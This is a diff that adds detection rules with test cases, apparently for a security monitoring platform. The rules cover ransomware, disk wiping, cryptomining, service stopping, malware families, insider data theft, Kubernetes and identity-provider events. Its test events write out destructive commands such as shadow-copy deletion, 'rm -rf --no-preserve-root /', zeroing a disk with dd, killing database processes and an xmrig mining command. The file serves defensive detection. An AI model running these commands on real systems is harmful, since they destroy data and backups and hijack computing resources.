+  tests:
+    - {event: {command_line: 'vssadmin.exe delete shadows /all /quiet'}, expect_match: true}
+    - {event: {command_line: 'bcdedit /set {default} recoveryenabled No'}, expect_match: true}
+    - {event: {command_line: 'vssadmin list shadows'}, expect_match: false}
+
+- id: TB-IMPACT-002
+  name: Ransomware indicators (extensions, ransom notes, mass encryption events)
+  severity: critical
+  confidence: 80
+  techniques: [T1486]
+  tags: [ransomware]
+  match:
+    any:
+      - {field: text, regex: '\.(locked|crypt|crypted|encrypted|lockbit|ryuk|conti|akira|blackcat|royal|hive|babuk|wncry|petya|djvu|cerber|basta|play|rhysida)\b'}
+      - {field: text, regex: '(your (files|data|network) (have been|are|were|is) (encrypted|locked|stolen)|all your files|decrypt(ion)? (key|tool|your files)|pay(ment)? .{0,30}(bitcoin|btc|monero)|how[_ ]?to[_ ]?(restore|recover|decrypt)|restore[-_ ]my[-_ ]files|readme[_-]?(to[_-])?(decrypt|restore))'}
+      - {field: event_type, regex: 'ransom'}
+      - {field: command_line, regex: '(cipher(\.exe)?\s+/w:|gpg\s.{0,60}--symmetric.{0,80}/(home|srv|var)|openssl\s+enc\s.{0,60}-aes.{0,120}-in\s+/(home|srv|var))'}
+  tests:
+    - {event: {title: 'File renamed to report.docx.lockbit'}, expect_match: true}
+    - {event: {event_type: file.create, raw_data: {file_name: 'README_TO_DECRYPT.txt', content: 'Your files have been encrypted. Pay 2 BTC'}}, expect_match: true}
+    - {event: {title: 'Unlocked account for user'}, expect_match: false}
+
+- id: TB-IMPACT-003
+  name: Cryptominer activity
+  severity: medium
+  confidence: 75
+  techniques: [T1496]
+  tags: [cryptominer]
+  match:
+    any:
+      - {field: text, regex: '\b(xmrig|minerd|cpuminer|ethminer|cgminer|bfgminer|nbminer|t-rex miner|stratum\+(tcp|ssl)|monero pool|coinhive|cryptonight)\b'}
+      - {field: text, regex: '\b(minexmr|supportxmr|nanopool|2miners|f2pool|nicehash|hashvault|moneroocean|unmineable)\.(com|org|net|to)'}
+      - {field: event_type, regex: 'crypto.?min|miner\.'}
+  tests:
+    - {event: {command_line: './xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u wallet'}, expect_match: true}
+    - {event: {title: 'Mining operations schedule updated'}, expect_match: false}
+
+- id: TB-IMPACT-004
+  name: Disk or file-system wiping, or mass deletion command
+  severity: critical
+  confidence: 85
+  techniques: [T1485]
+  tags: [destruction, wiper]
+  match:
+    any:
+      - {field: command_line, regex: 'rm\s+(-\w*r\w*f\w*|-\w*f\w*r\w*)\s+(--no-preserve-root\s+)?/(\s|\*|$|\s*--no-preserve-root)'}
+      - {field: command_line, regex: '(dd\s+if=/dev/(zero|urandom|random)\s+of=/dev/(sd|nvme|xvd|vd|hd)\w{1,8}|shred\s.{0,20}-\w*z\w*\s+/dev/(sd|nvme|xvd)\w{1,8}|mkfs(\.\w{2,6})?\s+/dev/(sd|nvme|xvd)\w{1,8}|wipefs\s.{0,10}-a\s+/dev/\w{1,12})'}
+      - {field: command_line, regex: '(format\s+[a-z]:\s.{0,20}/(fs|y|q)|del\s+/(f|s|q)\s.{0,20}[a-z]:\\\*|cipher\s+/w:[a-z]:\\|sdelete(64)?\s.{0,20}-(p|z|c)\s.{0,40}[a-z]:\\)'}
+  tests:
+    - {event: {command_line: 'rm -rf --no-preserve-root /'}, expect_match: true}
+    - {event: {command_line: 'dd if=/dev/zero of=/dev/sda bs=1M'}, expect_match: true}
+    - {event: {command_line: 'rm -rf /tmp/build'}, expect_match: false}
+
+- id: TB-IMPACT-005
+  name: Backup, database or security services stopped in bulk
+  severity: high
+  confidence: 70
+  techniques: [T1489]
+  tags: [ransomware, service-stop]
+  match:
+    any:
+      - {field: command_line, regex: 'net\s+stop\s+"?(veeam\w{0,30}|sql\w{0,30}|mssql\w{0,30}|vss|backup\w{0,20}|sophos\w{0,30}|mysql\w{0,10}|oracle\w{0,30}|exchange\w{0,30}|msexchange\w{0,30}|wsbexchange)'}
+      - {field: command_line, regex: '(sc(\.exe)?\s+config\s+(vss|sql\w{0,20}|veeam\w{0,20}|mssql\w{0,20})\s+start=\s?disabled|taskkill\s.{0,20}/im\s+(sqlservr|oracle|veeam\w{0,20}|mysqld|postgres|store\.exe|vmms)\w{0,10}\.exe)'}
+      - {field: command_line, regex: '(systemctl\s+(stop|disable)\s+(mysql|mariadb|postgresql|mongod|redis|elasticsearch|veeamservice|bacula-\w{1,10})(\.service)?)'}
+  tests:
+    - {event: {command_line: 'net stop "Veeam Backup Service" /y'}, expect_match: true}
+    - {event: {command_line: 'taskkill /F /IM sqlservr.exe'}, expect_match: true}
+    - {event: {command_line: 'net start spooler'}, expect_match: false}
+
+- id: TB-IMPACT-006
+  name: Network or application denial-of-service reported by a sensor
+  severity: high
+  confidence: 70
+  techniques: [T1498, T1499]
+  tags: [ddos, availability]
+  match:
+    any:
+      - {field: event_type, regex: '(ddos|dos_attack|syn_flood|udp_flood|icmp_flood|http_flood|amplification|volumetric|slowloris|network\.flood)'}
+      - {field: text, regex: '\b(ddos|denial[- ]of[- ]service|syn flood|udp flood|icmp flood|http flood|slowloris|dns amplification|ntp amplification|volumetric attack)\b'}
+  tests:
+    - {event: {title: 'SYN flood detected on edge-fw-1'}, expect_match: true}
+    - {event: {event_type: network.ddos_mitigation}, expect_match: true}
+    - {event: {title: 'Firewall rule updated'}, expect_match: false}
+
+- id: TB-IMPACT-007
+  name: Forced shutdown or reboot of a host from the command line
+  severity: low
+  confidence: 45
+  techniques: [T1529]
+  tags: [impact, availability]
+  tuning: Low confidence on its own; valuable as a stage in a correlated chain.
+  match:
+    any:
+      - {field: command_line, regex: 'shutdown(\.exe)?\s.{0,20}(/s|/r|-h|-r|-P)\s.{0,20}(/f|/t\s?[01]\b|now)'}
+      - {field: command_line, regex: '\b(poweroff|halt|init\s+0)\s+(-f|--force)'}
+  tests:
+    - {event: {command_line: 'shutdown /s /f /t 0'}, expect_match: true}
+    - {event: {command_line: 'shutdown /a'}, expect_match: false}
+
+# =============================================================== MALWARE / SUSPICIOUS FILE & PROCESS
+- id: TB-MAL-001
+  name: Malware family, offensive framework or AV detection reported
+  severity: high
+  confidence: 80
+  techniques: [T1204.002]
+  tags: [malware, av-detection]
+  match:
+    any:
+      - {field: text, regex: '\b(wannacry|notpetya|emotet|qakbot|qbot|trickbot|icedid|bumblebee|redline stealer|raccoon stealer|lumma|asyncrat|njrat|remcos|agent ?tesla|formbook|lokibot|dridex|ursnif|gozi|zloader|blackcat|alphv|lockbit|ryuk|conti|blackbasta)\b'}
+      - {field: text, regex: 'X5O!P%@AP\[4\\PZX54\(P\^\)7CC\)7\}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE'}
+      - {field: event_type, regex: '^(antivirus|av|edr|malware)\.(detect|quarantin|block|threat|alert)'}
+      - {field: raw.threat_name, regex: '.{3,}'}
+  tests:
+    - {event: {event_type: antivirus.detected, raw_data: {threat_name: 'Trojan.GenericKD.1234'}}, expect_match: true}
+    - {event: {raw_data: {content: 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'}}, expect_match: true}
+    - {event: {title: 'Contiguous block allocation failed'}, expect_match: false}
+
+- id: TB-MAL-002
+  name: Executable launched from a user-writable or memory-backed location
+  severity: medium
+  confidence: 60
+  techniques: [T1204.002, T1036]
+  tags: [malware, staging]
+  tuning: Installers and portable apps run from Downloads; focus on servers or add the parent to exclusions.
+  match:
+    all:
+      - {field: event_type, regex: '^process\.(start|create)'}
+      - {field: raw.process_path, regex: '(/dev/shm/|/var/tmp/\.|/tmp/\.|\\appdata\\local\\temp\\.{0,60}\.exe|\\users\\public\\.{0,60}\.exe|\\programdata\\.{0,60}\.(exe|scr)|\\downloads\\.{0,60}\.(exe|scr)|memfd:)'}
+      - not: {field: raw.parent_process, regex: '^(msiexec|setup|installer|chrome|msedge|firefox|explorer|svchost|ccmexec|intunemanagementextension)(\.exe)?$'}
+  tests:
+    - {event: {event_type: process.start, raw_data: {process_path: 'C:\Users\bob\AppData\Local\Temp\a1b2.exe', parent_process: 'cmd.exe'}}, expect_match: true}
+    - {event: {event_type: process.start, raw_data: {process_path: '/dev/shm/kworker', parent_process: bash}}, expect_match: true}
+    - {event: {event_type: process.start, raw_data: {process_path: 'C:\Program Files\App\app.exe', parent_process: explorer.exe}}, expect_match: false}
+
+- id: TB-MAL-003
+  name: Double-extension or script file executed from a document-themed name
+  severity: high
+  confidence: 70
+  techniques: [T1204.002, T1036]
+  tags: [malware, masquerading]
+  match:
+    any:
+      - {field: process_name, regex: '\.(pdf|docx?|xlsx?|txt|jpe?g|png)\.(exe|scr|com|bat|cmd|js|vbs)$'}
+      - {field: command_line, regex: '\.(pdf|docx?|xlsx?|txt|jpe?g|png)\.(exe|scr|com|bat|cmd|js|vbs)\b'}
+  tests:
+    - {event: {process_name: 'invoice.pdf.exe'}, expect_match: true}
+    - {event: {process_name: 'invoice.exe'}, expect_match: false}
+
+# =============================================================== INSIDER / SUSPICIOUS USER ACTIVITY
+- id: TB-INSIDER-001
+  name: Bulk document or repository download / export
+  severity: medium
+  confidence: 60
+  techniques: [T1213, T1530, T1005]
+  tags: [insider, data-theft]
+  tuning: Tune the count to your normal sync/export behaviour; consider per-role allow-lists.
+  match:
+    all:
+      - {field: event_type, regex: '^(file|document|storage|repository)\.(download|export|bulk|clone)'}
+      - {field: raw.file_count, gte: 100}
+  tests:
+    - {event: {event_type: file.download_bulk, raw_data: {file_count: 850}}, expect_match: true}
+    - {event: {event_type: file.download, raw_data: {file_count: 1}}, expect_match: false}
+
+- id: TB-INSIDER-002
+  name: Access by a disabled, terminated or suspended account
+  severity: high
+  confidence: 80
+  techniques: [T1078]
+  tags: [insider, identity, offboarding]
+  match:
+    any:
+      - {field: raw.user_status, in: [terminated, disabled, suspended, deprovisioned, deactivated]}
+      - {field: text, regex: '(sign-?in|login|access) (attempt )?(by|from|with) (a )?(disabled|terminated|deprovisioned|suspended|deactivated) (account|user)'}
+  tests:
+    - {event: {event_type: authentication.success, raw_data: {user_status: terminated}}, expect_match: true}
+    - {event: {event_type: authentication.success, raw_data: {user_status: active}}, expect_match: false}
+
+- id: TB-INSIDER-003
+  name: Access to sensitive data store by an unusual process or with restricted-classification marker
+  severity: medium
+  confidence: 55
+  techniques: [T1213, T1005]
+  tags: [insider, data-access]
+  match:
+    any:
+      - {field: raw.data_classification, in: [restricted, secret, confidential-hr, pii-bulk, phi]}
+      - {field: command_line, regex: '(select|dump|copy|export).{0,60}(from|table)\s.{0,40}(ssn|credit_?card|payroll|salaries|patient|pii|passport)'}
+  tests:
+    - {event: {raw_data: {data_classification: restricted}}, expect_match: true}
+    - {event: {raw_data: {data_classification: public}}, expect_match: false}
+
+# =============================================================== CONTAINER / WORKLOAD RUNTIME
+- id: TB-CONT-001
+  name: Runtime sensor alert from a container workload (shell, sensitive read, escape)
+  severity: high
+  confidence: 70
+  techniques: [T1609, T1611, T1552.001]
+  tags: [container, runtime, falco]
+  match:
+    any:
+      - all:
+          - {field: event_type, regex: '^container\.'}
+          - {field: raw.priority, in: [critical, alert, emergency]}
+      - all:
+          - {field: event_type, regex: '^container\.'}
+          - {field: text, regex: '(terminal shell in container|shell (was )?spawned (in|by) (a )?container|read sensitive file untrusted|write below (binary|etc) dir|netcat remote code execution|drop and execute new binary|contact k8s api server from container|detect (outbound connections to common miner pools|crypto miners?)|container drift detected|launch (privileged|sensitive mount) container)'}
+  tests:
+    - {event: {event_type: container.runtime_alert, raw_data: {priority: Critical, rule: 'Terminal shell in container'}}, expect_match: true}
+    - {event: {event_type: container.runtime_alert, raw_data: {priority: Notice, rule: 'Container health check'}}, expect_match: false}
+
+- id: TB-CONT-002
+  name: Kubernetes API accessed anonymously or from an unexpected identity
+  severity: high
+  confidence: 70
+  techniques: [T1078, T1613]
+  tags: [kubernetes, identity]
+  match:
+    any:
+      - all:
+          - {field: event_type, regex: '^container\.k8s\.'}
+          - {field: username, regex: '^system:anonymous$'}
+          - {field: raw.response_code, in: [200, 201, 202]}
+      - all:
+          - {field: event_type, regex: '^container\.k8s\.'}
+          - {field: raw.verb, in: [delete, deletecollection]}
+          - {field: raw.resource, in: [namespaces, nodes, clusterroles, persistentvolumes]}
+  tests:
+    - {event: {event_type: container.k8s.audit, username: 'system:anonymous', raw_data: {response_code: 200}}, expect_match: true}
+    - {event: {event_type: container.k8s.audit, username: 'system:anonymous', raw_data: {response_code: 403}}, expect_match: false}
+
+# =============================================================== IDENTITY PROVIDER SPECIFIC
+- id: TB-IDP-001
+  name: Identity provider security control weakened (MFA policy, session policy, SSO or admin role)
+  severity: high
+  confidence: 70
+  techniques: [T1556, T1098]
+  tags: [identity, okta, azure-ad]
+  match:
+    any:
+      - {field: raw.eventType, in: [policy.lifecycle.update, policy.rule.update, policy.lifecycle.deactivate, policy.rule.deactivate, user.mfa.factor.deactivate, user.mfa.factor.reset_all, system.api_token.create, application.lifecycle.update, user.account.privilege.grant, group.privilege.grant]}
+      - {field: event_type, regex: '^identity\.(policy_changed|mfa_disabled|mfa_reset|api_token_created|sso_config_changed)'}
+  tests:
+    - {event: {raw_data: {eventType: user.mfa.factor.reset_all}}, expect_match: true}
+    - {event: {raw_data: {eventType: user.session.start}}, expect_match: false}
